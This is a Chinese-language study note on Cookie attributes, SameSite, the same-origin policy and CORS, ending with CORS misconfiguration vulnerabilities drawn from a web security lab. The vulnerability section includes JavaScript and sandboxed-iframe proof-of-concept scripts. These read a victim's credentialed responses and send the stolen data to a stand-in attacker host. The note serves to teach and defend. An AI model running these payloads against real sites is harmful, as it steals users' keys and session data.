# 一、历史发展

##### 阶段 1：Cookie 诞生

网景公司为了实现电商「购物车」这个核心业务刚需，发明了 Cookie—— 这是 Web 第一次拥有「状态记忆能力」，能记住用户的登录信息、购物记录。

- 此时的 Web 只有纯静态 HTML，**连 JavaScript 都还没发明**，没有任何可编程能力，
- 此时的 Cookie 只有最基础的「键值对 + 过期时间」。

##### 阶段 2：SOP 同源策略紧急上线

1995 年网景推出了 JavaScript，第一次让静态页面有了可编程能力：可以操作 DOM、读取 Cookie、发起网络请求。

- 技术一上线，立刻出现致命漏洞：恶意网站的 JS，可以直接读取你同时打开的银行页面的 Cookie、账户余额、DOM 内容，整个 Web 的身份体系直接崩溃；
- 网景紧急在浏览器里上线了**SOP 同源策略**，这是 Web 安全的第一块基石，核心规则：**非同源的 JS，只能发起请求，但绝对不能读取其他源的响应、Cookie、DOM**。

> 为什么**浏览器允许跨源请求携带 Cookie**，但 SOP 只限制「JS 读取 Cookie」？
>
> 因为 Cookie 是 1994 年就确立的 Web 底层机制，浏览器默认按域名 / 路径自动携带 Cookie，这是图片加载、页面跳转、会话保持的业务基础。
>
> 1995 年 SOP 诞生时，**不能破坏已有的 Web 底层行为**，因此 SOP 只负责限制**JS 读取跨源的 Cookie 和响应数据**，完全不干涉浏览器正常发送请求、携带 Cookie 的逻辑。
>
> 控制跨站请求是否携带 Cookie 的是后来的 `SameSite` 等 Cookie 属性，并非 SOP 的职责。

##### 阶段 3：Cookie 基础安全配置补齐

SOP 上线后，业务适配问题和基础安全漏洞依然存在，浏览器给 Cookie 打了第一波基础补丁：

- 为了实现父子域名（`a.example.com`和`example.com`）共享登录态，新增**Domain、Path**配置，精准控制 Cookie 的作用范围；
- 为了防止 Cookie 在 HTTP 明文传输中被网络窃听，新增**Secure**配置，限制 Cookie 只能在 HTTPS 加密协议中传输。

##### 阶段 4：Web2.0 爆发，跨源刚需催生野路子方案（2000-2004 年，CORS 的前身铺垫期）

这一阶段 AJAX 技术诞生，Web 从静态文档升级为动态应用，前后端分离架构萌芽，**SOP 的核心规则和合法业务需求的矛盾彻底爆发**：

- 业务痛点：前端页面部署在`app.example.com`，后端 API 部署在`api.example.com`，二者属于跨源，SOP 允许 JS 发起请求，但禁止读取接口响应，业务完全无法正常运行；
- 野路子方案诞生：开发者被迫搞出了 JSONP、iframe 代理、flash 跨域等非正规方案，其中 JSONP 最主流 —— 利用`<script>`标签不受 SOP 限制的特性，绕开 SOP 的读取限制，实现跨源数据获取；
- 致命缺陷：这些方案没有任何安全管控能力，极易引发 XSS、信息泄露、CSRF 等安全漏洞，同时只能支持 GET 请求，无法满足复杂业务需求，行业急需一个官方、安全、可控的跨源解决方案。

##### 阶段 5：针对 XSS 的 HttpOnly 配置上线

000 年后 XSS 攻击大规模爆发：攻击者把恶意脚本注入到目标网站的同源页面，SOP 对同源内的脚本无限制，恶意代码可以直接偷走用户的登录 Cookie。

- 微软在 IE6 中新增**HttpOnly**配置：标记了该属性的 Cookie，**哪怕是同源的 JS 也完全无法读取**，只能在 HTTP 请求中自动携带，专门防御 XSS 偷 Cookie 的核心攻击场景。

##### 阶段 6：CORS 官方标准诞生与落地

JSONP 等野路子方案的安全风险和功能缺陷已经无法容忍，行业需要一个浏览器原生支持、服务器可控、安全合规的跨源机制，CORS 应运而生。

CORS 没有突破 SOP 的核心规则，而是给 SOP 加了一套 **「服务器授权，浏览器放行」的受控白名单机制 **：

- 基础规则不变：非同源的 JS 发起请求，浏览器依然会默认拦截响应体，JS 无法读取；
- 授权机制：服务器通过`Access-Control-Allow-Origin`等响应头，明确告知浏览器哪些源是可信的；
- 浏览器校验：只有服务器返回了合法的 CORS 授权头，且源匹配，浏览器才会把响应体交给 JS，否则直接拦截；
- 针对 Cookie 的配套规则：跨源请求需要携带 Cookie 时，必须同时满足四个条件：cookie设置为允许携带，JS 端开启`credentials: include`、服务器返回`Access-Control-Allow-Credentials: true`、服务器`Access-Control-Allow-Origin`不能为通配符`*`，必须是具体的源，彻底堵住了安全漏洞。



# 二、cookie

本节主要介绍cookie在默认配置下和一些特殊场景下的交互行为，如果需要了解更多，请参考[MDN](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Guides/Cookies)。

### 1.默认配置

当服务器通过 `Set-Cookie` 响应头向客户端写入 Cookie，且未附加任何配置属性时，其默认行为如下：

- 生命周期 (Lifecycle)
  如果未设置 `Expires` 或 `Max-Age` 属性，浏览器会将该 Cookie 存储在内存中而非磁盘上。当浏览器进程彻底关闭时，该 Cookie 会失效。
- 作用域 (Domain & Path)
  - **Domain**：默认值为发起响应的 **Host**。例如，由 `app.example.com` 设置的 Cookie 不会自动发送给 `test.app.example.com`。
  - **Path**：默认值为当前请求 URL 的目录。例如在 `/docs/page.html` 下设置的 Cookie，其默认路径为 `/docs/`，访问 `/others/` 时不会携带该 Cookie。
- 传输行为 (Transmission)
  为了防止 CSRF 攻击，主流浏览器（如 Chrome 80+、Firefox、Edge）现在默认将未指定属性的 Cookie 视为 **`SameSite=Lax`**。：这意味着在跨站（Cross-Site）的 POST 请求或 iframe 加载中，浏览器不会自动附加该 Cookie；只有在同站请求或用户点击链接进行顶层导航（GET）时才会携带。

### 2.Cookie 的配置属性

服务器通过 `Set-Cookie` 指令的属性来精确控制 Cookie 的行为边界：

- `Expires` / `Max-Age`：定义 Cookie 的持久性。`Expires` 设定一个具体的 HTTP 日期时间，`Max-Age` 设定从当前时间开始计算的有效秒数。若两者同时存在，`Max-Age` 的优先级更高。
- `Domain`：指定 Cookie 的有效域名。如果显式设置了 `Domain=example.com`，则该 Cookie 也将包含在其子域名（如 `sub.example.com`）的请求中。
- `Path`：指定请求 URL 中必须存在的路径前缀，请求才能携带该 Cookie。例如 `Path=/docs`，则 `/docs/Web/` 会携带，而 `/images/` 不会。
- `Secure`：指示浏览器仅在使用安全协议（HTTPS）传输数据时才发送该 Cookie，防止 Cookie 在中间人攻击中被窃听。
- `HttpOnly`：禁止通过客户端脚本（如 `document.cookie`）访问该 Cookie。这能有效缓解跨站脚本攻击（XSS）带来的会话劫持风险。
- `SameSite`：控制在跨站请求时，是否发送 Cookie。这是防御跨站请求伪造（CSRF）的核心属性。

### 3. samesite属性

**浏览器盲目发送 Cookie** 在 `SameSite` 机制出现之前，浏览器的默认行为存在一个巨大的安全隐患：只要 HTTP 请求的目标域名与 Cookie 的所属域名相匹配，浏览器就会自动在请求中带上这些 Cookie（通常包含代表用户身份的 Session 会话信息）。 浏览器**根本不关心这个请求是从哪里发起的**。攻击者正是利用了这一点，在自己的恶意网站上放置代码，当受害者访问恶意网站时，浏览器会悄悄向银行等目标网站发送恶意请求，并且**自动带上了受害者在目标网站的合法 Cookie**。服务器验证 Cookie 无误，就会把这个恶意请求当成用户的真实意愿去执行，这就是 CSRF 攻击。

`SameSite` 机制决定了：**当浏览器发起一个源自 A 网站（发起方）、且指向 B 网站（目标方）的跨站请求时，浏览器是否应该自动在这条请求中附带上 B 网站（目标方）的 Cookie**。

### 4. 什么叫跨站？

“站”的定义是**`Scheme` + `eTLD+1`** （有效顶级域名 + 一级域名），采用相同Scheme和相同 eTLD+1 的网站被视为“同一网站”。采用不同方案或不同 eTLD+1 的网站称为“跨站”。

![Site (TLD+1)](./image/sop%E5%92%8Ccros/site-tld1-ae5ebbc587fbe.png)

例如：

| Origin  A                   | Origin B                      | “同站点”还是“跨站点”？       |
| :-------------------------- | :---------------------------- | :--------------------------- |
| https://www.example.com:443 | https://www.evil.com:443      | 跨站点：不同域名             |
|                             | https://login.example.com:443 | 同站：不同的子域名无关紧要   |
|                             | http://www.example.com:443    | **跨站：scheme不同**         |
|                             | https://www.example.com: 80   | **同站：不同的端口无关紧要** |
|                             | https://www.example.com       | **同站**                     |

**特例**：`user.github.io` 和 `other.github.io` 属于**跨站**（因为 `github.io` 在[公共后缀列表](https://wiki.mozilla.org/Public_Suffix_List)中被视为顶级域名）。



### 5. cookie携带场景

| 请求类型         | 具体场景                                                     | 攻防对应                 |
| ---------------- | ------------------------------------------------------------ | ------------------------ |
| 顶级 GET 导航    | 用户点击`<a>`标签跳转、地址栏输入、`location.href`跳转、GET 表单顶级跳转 | 反射型 XSS、GET 型 CSRF  |
| 子资源加载       | `<img src>`、`<script src>`、`<link href>`、`<iframe src>`、CSS 背景图等自动加载的资源 | CSRF、数据泄露、CSP 绕过 |
| JS 异步请求      | `fetch()`、`XMLHttpRequest`（AJAX）                          | CORS 攻击、XSS 盲打      |
| 非顶级 POST 提交 | 隐藏表单自动 POST 提交、JS 触发的表单提交                    | POST 型 CSRF             |

1. SameSite=Strict（最严格）

   | 场景          | 跨站请求 |
   | ------------- | -------- |
   | 顶级 GET 导航 | ❌ 不携带 |
   | 子资源加载    | ❌ 不携带 |
   | JS 异步请求   | ❌ 不携带 |
   | POST 表单提交 | ❌ 不携带 |

2. SameSite=Lax（浏览器默认)

   | 场景          | 跨站请求      |
   | ------------- | ------------- |
   | 顶级 GET 导航 | ✅ 携带 Cookie |
   | 子资源加载    | ❌ 不携带      |
   | JS 异步请求   | ❌ 不携带      |
   | POST 表单提交 | ❌ 不携带      |

   Lax 只给「用户主动点击的顶级 GET 跳转」开跨站携带权限，其他所有跨站场景全拦。

3. SameSite=None; Secure（高危配置）

   | 场景          | 跨站请求      |
   | ------------- | ------------- |
   | 顶级 GET 导航 | ✅ 携带 Cookie |
   | 子资源加载    | ✅ 携带 Cookie |
   | JS 异步请求   | ✅ 携带 Cookie |
   | POST 表单提交 | ✅ 携带 Cookie |

> 这里只讨论是否携带cookie，当发送普通请求时，或者普通的异步请求时，只要samesite设置符合跨站携带的要求，或异步请求中开启了凭证模式，该cookie就会被带出



# 三、同源策略SOP

同源策略（Same-Origin Policy ）是一种指导 Web 浏览器如何在网页之间进行交互的策略。根据此策略，一个网页上的脚本只有在两个网页具有相同的源时才能访问另一个网页上的数据。该策略旨在防止一个页面上的恶意脚本通过浏览器访问另一个网页上的敏感数据。

### 1. 同源的判定

![Origin](./image/sop%E5%92%8Ccros/origin-scheme.png)

"**Origin**" 是一个由[scheme](https://developer.mozilla.org/docs/Web/HTTP/Basics_of_HTTP/Identifying_resources_on_the_Web#Scheme_or_protocol)（也称为[protocol](https://developer.mozilla.org/docs/Glossary/Protocol)，例如 HTTP 或 HTTPS）、主机名和端口号（如果指定）组成的组合。例如，给定一个 URL https://www.example.com:443/foo ，其 "origin" 是 https://www.example.com:443。

例如下面的例子：

源A 为： https://www.example.com:443

| 源 B                                                        | “同源” 还是 “跨源”？        |
| ----------------------------------------------------------- | --------------------------- |
| [https://www.evil.com:443](https://www.evil.com/)           | 跨域：不同领域              |
| [https://example.com:443](https://example.com/)             | 跨域：不同的子域            |
| [https://login.example.com:443](https://login.example.com/) | 跨域：不同的子域            |
| [http://www.example.com:443](http://www.example.com:443/)   | 跨域：不同的方案            |
| [https://www.example.com](https://www.example.com/): 80     | 跨域：不同的端口            |
| [https://www.example.com:443](https://www.example.com/)     | 同源：完全匹配              |
| [https://www.example.com](https://www.example.com/)         | 同源：隐式端口号 (443) 匹配 |

> [!NOTE]
>
> Cross-origin 在一般口语中翻译为 跨域 ，w3c翻译为跨源，其实是同一个事物

###  2. SOP 的核心限制规则

同源策略的核心管控对象，是 JavaScript 代码对**跨源**加载内容的访问权限。页面跨源加载静态资源通常是被允许的。

例如，SOP 允许通过`<img>`标签嵌入图片、`<video>`标签嵌入媒体文件、`<script>`标签引入 JavaScript 脚本。但是，尽管页面可以加载这些外部资源，页面上的任何 JavaScript 代码**都无权读取这些资源的内容**。

SOP 并不是一刀切地拦截所有跨源请求，它在安全与 Web 站点的可用性之间做出了平衡。通常，它将跨源交互分为以下三类：

- **严格阻止“跨源读取” (Cross-origin reads)**：这是 SOP 防御的核心。例如，JavaScript 无法读取跨源 `<iframe>` 里面的文档内容，也无法获取跨源图片的二进制数据。
- **通常允许“跨源嵌入” (Cross-origin embedding)**：浏览器允许页面加载来自其他源的资源进行展示，例如通过 `<script src="...">` 加载外部脚本，使用 `<img>`、`<video>` 展示多媒体，以及使用 `<link>` 加载 CSS 样式。
- **通常允许“跨源写入” (Cross-origin writes)**：例如点击跨源链接、重定向以及**提交表单数据**到另一个源。（注：正是因为 SOP 允许跨源表单提交，才催生了跨站请求伪造 CSRF 攻击漏洞，因此需要 CSRF Token 等额外防御手段）。

同源策略存在以下多种例外情况：

1. 部分对象支持**跨源写入但禁止读取**：例如 iframe 或新窗口中的`location`对象、`location.href`属性。
2. 部分对象支持**跨源读取但禁止写入**：例如`window`对象的`length`属性（记录页面使用的框架数量）、`closed`属性。
3. 通常可以跨源调用`location`对象上的`replace`方法。
4. 部分函数支持跨源调用：例如你可以对新窗口调用`close`、`blur`、`focus`方法；也可以对 iframe 或新窗口调用`postMessage`方法，实现跨域名的消息传递。

# 四、跨域资源共享CORS

跨域资源共享 (CORS) 是一种浏览器机制，它允许对位于给定域之外的资源进行受控访问。它扩展并增强了同源策略 (SOP) 的灵活性。然而，如果网站的 CORS 策略配置和实施不当，它也可能导致跨域攻击。CORS 并不能防御跨域攻击，例如跨站请求伪造 (CSRF)。

跨源资源共享（CORS）是一套基于 HTTP 头部定义的标准化 Web 安全机制，由**服务器端声明跨源资源的访问授权规则**，由**浏览器端强制执行校验逻辑**，核心作用是在同源策略（Same-Origin Policy, SOP）的默认严格隔离框架下，实现受控、可审计的跨源资源访问权限放宽。

------

### 1. CORS 的设计背景

同源策略的核心安全规则为：浏览器默认允许前端脚本发起跨源 HTTP 请求，但会**拦截所有未经授权的跨源响应数据，禁止前端 JavaScript 代码读取**，以此阻断恶意脚本跨源窃取用户敏感数据的核心风险。

随着现代 Web 应用架构的发展，前后端分离、子域名业务拆分、第三方服务集成等场景，均存在合法的跨源数据读取与交互需求。为了在不突破同源策略核心安全边界的前提下，为合法业务提供标准化、可管控的跨源访问解决方案，W3C 将 CORS 纳入正式 Web 规范，成为目前跨源资源访问的全球通用标准。

------

### 2. CORS 的核心工作机制

CORS 的完整执行流程，基于浏览器与服务器之间的 HTTP 头部协商完成，全流程严格遵循**「服务器主动授权、浏览器强制校验、默认拒绝访问」**的安全原则，各环节的职责与执行逻辑如下：

#### 2.1. 基础跨源访问授权校验

这是 CORS 机制的核心校验环节，用于明确服务器信任的跨源访问方，执行流程如下：

1. 浏览器发起跨源 HTTP 请求时，会自动在请求头部添加`Origin`字段，精准声明该请求的发起源（格式为「协议 + 完整域名 + 端口」）；

2. 服务器接收请求后，若允许该跨源访问，必须在 HTTP 响应头部返回

   ```
   Access-Control-Allow-Origin
   ```

   字段，声明授权的访问源；

   - 该字段可配置为**单个明确的可信源**，例如`https://innocent-website.com`；
   - 对于无敏感数据的公开资源，可配置为通配符`*`，表示允许所有源的跨源访问；

   > [!NOTE]
   >
   > 如果不信任访问者，不返回 `Access-Control-Allow-Origin` 这个响应头

3. 浏览器接收响应后，会校验发起请求的源是否匹配`Access-Control-Allow-Origin`的授权范围；若匹配失败，浏览器将在客户端层面直接拦截响应体，禁止前端 JavaScript 读取任何响应内容，仅能捕获到网络请求异常。

<img src="./image/sop%E5%92%8Ccros/image-20260409131445348.png" alt="image-20260409131445348" style="zoom:50%;" />

#### 2.2. 跨源身份凭证授权（Access-Control-Allow-Credentials）

浏览器默认禁止跨源请求携带用户身份凭证（包括 Session Cookie、HTTP 认证信息、TLS 客户端证书等）。若跨源业务需要基于用户会话进行身份鉴权，需完成客户端与服务器的双向合规配置，完整执行规则如下：

1. 客户端侧：凭证携带的触发配置

跨源请求要携带身份凭证，客户端必须显式开启凭证携带配置，这是浏览器在请求中携带凭证的唯一必要前提：

- Fetch API 需显式设置 `credentials: 'include'`；
- XMLHttpRequest 需显式设置 `xhr.withCredentials = true`。

> 规范说明：未开启上述配置时，浏览器默认不会在跨源请求中携带任何身份凭证；开启配置后，浏览器会按规则在请求中携带目标域的身份凭证，与服务器侧的 CORS 配置无关。

> [!WARNING]
>
> 对于跨站的 JS 异步请求（Fetch/AJAX），无论是 GET 还是 POST，`SameSite=Lax` 的 Cookie **一律不携带**。

> [!NOTE]
>
> 通过点击触发的**浏览器原生行为**（a 标签跳转、form 表单提交、原生窗口打开等），**完全不受 CORS 规则约束，也不受 SOP 对 JS 跨源请求的管控**；Cookie 是否携带，**仅由 Cookie 自身的属性（SameSite、Domain、Path、Secure）决定**

2. 服务器侧：响应读取的授权配置

服务器必须在 HTTP 响应中返回合规的 CORS 授权头，浏览器才会允许前端 JavaScript 代码**读取带凭证的跨源请求的响应内容**，核心配置要求如下：

-  `Access-Control-Allow-Credentials: true`表示同意js代码读取响应内容，或者在预检中表示同意携带认证信息；
- `Access-Control-Allow-Origin` 禁止使用通配符 `*`，必须配置为与请求发起源完全匹配的单个明确可信源；
- 对于需预检的复杂请求，`Access-Control-Allow-Methods` 与 `Access-Control-Allow-Headers` 禁止使用通配符 `*`，必须显式声明授权的方法与请求头。

3. 预检请求的特殊规则

对于需预检的复杂跨源请求，预检请求本身不会携带任何身份凭证；只有预检响应中满足上述所有 CORS 授权规则，浏览器才会发送带身份凭证的真实业务请求。

4. 最终生效逻辑

- 仅客户端开启凭证配置：浏览器会发送带凭证的跨源请求，服务器会正常处理请求，但浏览器会拦截响应体，前端 JS 无法读取响应内容；
- 客户端开启配置 + 服务器返回合规 CORS 头：浏览器发送带凭证的请求，且允许前端 JS 读取完整的响应内容，完整实现带身份鉴权的跨源业务交互。

#### 2.3. 预检请求机制（Preflight Checks）

对于可能对服务器端数据产生副作用、或不符合简单请求规范的复杂跨源请求，浏览器会在发送真实业务请求前，自动发起一次**OPTIONS 方法的预检请求**，提前向服务器确认授权规则；仅当预检请求校验通过后，浏览器才会发送真实的业务请求。

##### 触发预检请求的核心场景（满足任一即触发）

- 使用了`GET`、`HEAD`、`POST`之外的 HTTP 方法（如`PUT`、`DELETE`、`PATCH`等）；
- 手动设置了规范外的自定义请求头部（如`X-Token`、`Authorization`等）；
- `POST`请求的`Content-Type`不属于`application/x-www-form-urlencoded`、`multipart/form-data`、`text/plain`三类（如前后端分离架构常用的`application/json`）。

##### 预检请求的执行流程

1. 浏览器自动发起 OPTIONS 预检请求，携带三个核心协商头部：
   - `Origin`：请求发起源；
   - `Access-Control-Request-Method`：真实业务请求将使用的 HTTP 方法；
   - `Access-Control-Request-Headers`：真实业务请求将携带的自定义请求头部；
2. 服务器接收预检请求后，需通过响应头部返回对应的授权规则：
   - `Access-Control-Allow-Origin`：授权的访问源；
   - `Access-Control-Allow-Methods`：授权的 HTTP 方法列表；
   - `Access-Control-Allow-Headers`：授权的自定义请求头部列表；
   - 可选配置`Access-Control-Max-Age`：声明预检结果的缓存有效期，有效期内无需重复发起预检请求；
3. 浏览器校验预检响应的授权规则，若真实业务请求的方法、头部均在授权范围内，则发送真实业务请求；若校验失败，直接终止真实请求的发送，并抛出跨源异常。

------

### 3. 速查表

https://portswigger.net/web-security/cors/access-control-allow-origin

**服务器返回的响应头**

| 头部名称                             | 官方标准定义                                                 | 规范取值要求                                                 | 核心作用                                                     | 强制约束与关键注意事项                                       |
| ------------------------------------ | ------------------------------------------------------------ | ------------------------------------------------------------ | ------------------------------------------------------------ | ------------------------------------------------------------ |
| **Access-Control-Allow-Origin**      | 声明服务器授权可访问当前资源的跨源发起方                     | 1. 单个完整的可信源（格式：`协议+域名+端口`，如`https://innocent-website.com`）；2. 通配符`*`（仅允许无敏感数据的公开资源）；3. 特殊值`null`（不推荐生产环境使用） | CORS 机制的核心校验头部，浏览器通过该头部判断当前跨源请求是否有权读取响应数据 | 1. 规范强制要求：**一次响应只能配置 1 个值**，不支持逗号分隔的多个源；2. 当跨源请求携带身份凭证时，**禁止使用通配符`\*`**，必须配置明确的单个可信源；3. 端口、协议不一致会被判定为不同源，仅域名匹配无法通过校验。 |
| **Access-Control-Allow-Methods**     | 声明服务器授权的跨源请求 HTTP 方法                           | 逗号分隔的 HTTP 方法列表，如`GET, POST, PUT, DELETE`，支持通配符`*` | 用于预检请求的响应，告知浏览器真实业务请求可使用的 HTTP 方法，未在列表内的方法会被浏览器直接拦截 | 1. **仅在预检请求的响应中生效**，简单跨源请求无需配置该头部；2. 带凭证的跨源请求中，**禁止使用通配符`\*`**，必须显式声明允许的方法；3. `GET`、`HEAD`、`POST`为简单请求默认允许的方法，无需额外声明。 |
| **Access-Control-Allow-Headers**     | 声明服务器授权的跨源请求 HTTP 头部                           | 逗号分隔的请求头名称列表，如`Content-Type, Authorization, X-Token`，支持通配符`*` | 用于预检请求的响应，告知浏览器真实业务请求可携带的自定义头部，未在列表内的头部会被浏览器直接拦截 | 1. **仅在预检请求的响应中生效**；2. 仅 4 个「CORS 安全头部」默认允许：`Accept`、`Accept-Language`、`Content-Language`、`Content-Type`（仅限 3 种简单格式），其余所有自定义头部必须显式声明；3. 带凭证的跨源请求中，**禁止使用通配符`\*`**，必须显式声明允许的头部。 |
| **Access-Control-Max-Age**           | 声明预检请求结果的缓存有效期                                 | 非负整数，单位为**秒**；值为 0 时禁用预检缓存                | 用于预检请求的响应，在缓存有效期内，浏览器无需为相同规则的跨源请求重复发起 OPTIONS 预检，减少请求开销 | 1. 浏览器存在强制最大缓存上限：Chrome/Firefox 最大为 7200 秒（2 小时），Safari 最大为 600 秒（10 分钟），超过上限的取值会被强制截断；2. 仅对预检请求生效，不影响普通跨源请求；3. 部分老旧浏览器不支持该头部，会忽略缓存规则。 |
| **Access-Control-Allow-Credentials** | 告知浏览器是否允许前端 JavaScript 访问携带了身份凭证的跨源响应内容。 | 仅可设置为`true`；禁止跨源携带凭证时，直接不返回该头部即可，不可设置为`false` | 控制跨源请求是否可携带用户身份凭证（Cookie、HTTP 认证信息、TLS 客户端证书等），同时决定浏览器是否允许 JS 读取带凭证的响应数据 | 1. 开启该配置时，`Access-Control-Allow-Origin`、`Access-Control-Allow-Methods`、`Access-Control-Allow-Headers`**全部禁止使用通配符`*`**，必须显式声明具体值；2. 仅配置该头部无法实现凭证携带，客户端必须同步开启配置：Fetch API 需设置`credentials: 'include'`，XMLHttpRequest 需设置`xhr.withCredentials = true`；3. 仅 HTTPS 协议下的跨源请求可正常生效，HTTP 明文请求会被现代浏览器拦截。 |

**CORS 请求头**

| 浏览器自动发送的 CORS 请求头     | 核心作用                                 | 触发场景                                         |
| -------------------------------- | ---------------------------------------- | ------------------------------------------------ |
| `Origin`                         | 声明请求发起的完整源                     | 所有跨源请求（含简单请求、预检请求）都会自动携带 |
| `Access-Control-Request-Method`  | 告知服务器真实业务请求要使用的 HTTP 方法 | 仅预检请求自动携带                               |
| `Access-Control-Request-Headers` | 告知服务器真实业务请求要携带的自定义头部 | 仅预检请求自动携带                               |

# 五.CORS 配置问题导致的漏洞

许多现代网站使用 CORS 来允许来自子域名和受信任第三方的访问。为保证功能正常运行，其 CORS 实现可能存在错误或配置过于宽松，从而导致可被利用的安全漏洞。

## 1. 服务器根据客户端提交的 Origin 头动态生成 ACAO 响应头

部分应用需要向多个其他域名提供访问权限。维护允许域名的白名单需要持续投入，且任何失误都可能导致功能异常。因此，一些应用采用了简单粗暴的方式，实质上允许来自任意其他域名的访问。

实现方式之一是读取请求中的 Origin 头，并在响应头中直接声明该请求源是被允许的。例如，某应用收到如下请求：

```
GET /sensitive-victim-data HTTP/1.1
Host: vulnerable-website.com
Origin: https://malicious-website.com
Cookie: sessionid=...
```

随后返回响应：

```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://malicious-website.com
Access-Control-Allow-Credentials: true
...
```

这些响应头表明服务器允许来自当前请求域名的跨源访问，并通过 `Access-Control-Allow-Credentials: true` 授权浏览器向前端 JavaScript 暴露带身份凭证的响应内容。由于请求已由客户端开启凭证携带，浏览器会自动带上用户的会话 Cookie，使得服务器在用户的有效会话上下文中处理该请求。

由于应用会在 `Access-Control-Allow-Origin` 头中反射任意提交的 Origin，这意味着**任何域名**都可以访问该漏洞域名下的资源。如果响应中包含 API 密钥、CSRF Token 等敏感信息，攻击者可在自己的网站上放置如下脚本获取这些数据：

```javascript
// 1. 创建一个 XMLHttpRequest 对象（老式的前端网络请求工具）
var req = new XMLHttpRequest();

// 2. 绑定回调函数：请求成功完成后，自动执行 reqListener
req.onload = reqListener;

// 3. 配置请求：
//    请求方法：GET
//    请求地址：存在CORS漏洞的目标网站（敏感数据接口）
//    true：代表异步请求（前端标准写法）
req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);

// 4. 核心！开启跨源请求携带凭证（Cookie、Session）
// 对应我们之前讲的 withCredentials = true
req.withCredentials = true;

// 5. 发送这个跨源请求
req.send();

// 回调函数：请求成功后执行
function reqListener() {
    // this.responseText = 服务器返回的敏感数据
    // 跳转到攻击者的服务器，把偷到的数据拼接在URL里发送过去
	location='//malicious-website.com/log?key='+this.responseText;
};
```

> [!WARNING]
>
> 这种情况下只有 cookie 手动设置为SameSite=None; Secure 的情况下，才可以得到利用，默认情况下Cookie 默认 `SameSite=Lax` 绝对禁止 JS 跨站请求携带 Cookie，除非控制一个“同站”子域名

如下的案例：

该网站存在不安全的 CORS 配置，即信任所有来源。要解决此实验，请编写一些使用 CORS 获取管理员 API 密钥的 JavaScript，并将代码上传到您的漏洞利用服务器。当您成功提交管理员的 API 密钥时，实验即被解决。

您可以使用以下凭据登录到您自己的账户：wiener:peter

1.登录自己账号后，有一个如下的请求：

他允许携带cookie，并且应用会在 `Access-Control-Allow-Origin` 头中反射任意提交的 Origin

![image-20260409154357352](./image/sop%E5%92%8Ccros/image-20260409154357352.png)

并且在登录时，cookie设置如下：

![image-20260409154820816](./image/sop%E5%92%8Ccros/image-20260409154820816.png)

2. 构造利用脚本，并发送给受害者

   在自己的服务器上构造

   ![image-20260409155003661](./image/sop%E5%92%8Ccros/image-20260409155003661.png)

3. 当受害者访问这个链接时，将执行js代码，访问获取自身信息的url，之后读取返回的信息后，将信息返回给exploit-server。

该漏洞利用了以下几点：

1. **Cookie 跨站策略许可（发送端控制）：** 目标 Cookie 设置了 `SameSite=None; Secure`。这允许浏览器在跨站（Cross-site）异步请求中依然**自动携带**身份凭证（Cookie），使得攻击者的脚本能够以受害者的登录身份与服务器通信。
2. **CORS 配置缺陷（响应端控制）：** 服务器配置了**不安全的 Origin 反射机制**。它会动态地将请求头中的 `Origin` 字段反射到响应头的 `Access-Control-Allow-Origin` 中，并设置 `Access-Control-Allow-Credentials: true`。这打破了同源策略的限制，允许攻击者从任意恶意第三方网站发起请求，并**合法地读取**包含敏感信息的响应内容。

## 2. 解析 Origin 标头时出错

一些支持多源访问的应用程序使用允许源的白名单来实现这一点。当收到 CORS 请求时，应用程序会将提供的源与白名单进行比较。如果该源出现在白名单中，则会在 `Access-Control-Allow-Origin` 标头中反映出来，从而授予访问权限。例如，应用程序收到如下普通请求：

```http
GET /data HTTP/1.1
Host: normal-website.com
...
Origin: https://innocent-website.com
```

应用程序会将提供的来源与允许的来源列表进行比对，如果该来源在列表中，则会按如下方式反映该来源：

```http
HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://innocent-website.com
```

在实施 CORS 源白名单时，经常会出现错误。一些组织决定允许来自其所有子域（包括未来尚未存在的子域）的访问。而一些应用程序则允许来自其他各种组织的域（包括其子域）的访问。这些规则通常通过匹配 URL 前缀或后缀，或者使用正则表达式来实现。任何实施错误都可能导致对非预期外部域的访问权限被授予。

例如，假设一个应用程序允许访问所有以以下结尾的域名：normal-website.com

攻击者可能通过注册该域名来获取访问权限：hackersnormal-website.com

或者，假设一个应用程序允许访问所有以normal-website.com开头的域。攻击者可能能够利用该域名获得访问权限：normal-website.com.evil-user.net

## 3.白名单包含 null 源

Origin 请求头的规范支持 `null` 这一取值。浏览器在多种非常规场景下，都可能在 Origin 头中发送 `null`：

- 跨源重定向
- 来自序列化数据的请求
- 使用 `file:` 协议发起的请求
- 启用沙箱的跨源请求

部分应用为了支持本地开发，可能会将 `null` 源加入跨源白名单。例如，某应用收到如下跨源请求：

```http
GET /sensitive-victim-data
Host: vulnerable-website.com
Origin: null
```

服务器响应如下：

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

在这种情况下，攻击者可以利用多种技巧构造出 Origin 头为 `null` 的跨源请求，从而命中白名单，实现跨域访问。例如，可以使用带有沙箱的 iframe 发起跨源请求，代码形式如下：

```html
<!-- 这是一个带沙箱的 iframe，核心就是 sandbox 属性 -->
<iframe 
sandbox="allow-scripts allow-top-navigation allow-forms"  <!-- 沙箱规则：只允许运行JS、跳转、表单 -->
src="data:text/html,<script>
// 下面的代码，运行在【沙箱iframe】里
var req = new XMLHttpRequest();
req.onload = reqListener;
// 请求目标网站的敏感数据
req.open('get','vulnerable-website.com/sensitive-victim-data',true);
// 携带Cookie
req.withCredentials = true;
req.send();

// 请求成功后，把数据发给黑客服务器
function reqListener() {
location='malicious-website.com/log?key='+this.responseText;
};
</script>">
</iframe>
```

------

## 4. 利用 CORS 信任关系进行 XSS 攻击

即使是 “配置正确” 的 CORS，也会在两个源之间建立信任关系。如果一个网站信任了一个存在跨站脚本（XSS）漏洞的源，攻击者就可以利用该 XSS 漏洞注入一段 JavaScript 代码，通过 CORS 从信任该漏洞应用的网站中获取敏感信息。

假设存在如下请求：

```http
GET /api/requestApiKey HTTP/1.1
Host: vulnerable-website.com
Origin: https://subdomain.vulnerable-website.com
Cookie: sessionid=...
```

服务器返回：

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com
Access-Control-Allow-Credentials: true
```

那么，攻击者一旦在 `subdomain.vulnerable-website.com` 上发现 XSS 漏洞，就可以利用类似如下的 URL 获取 API 密钥：

```url
https://subdomain.vulnerable-website.com/?xss=<script>cors-stuff-here</script>
```



------

## 5.利用配置不当的 CORS 破坏 TLS 安全

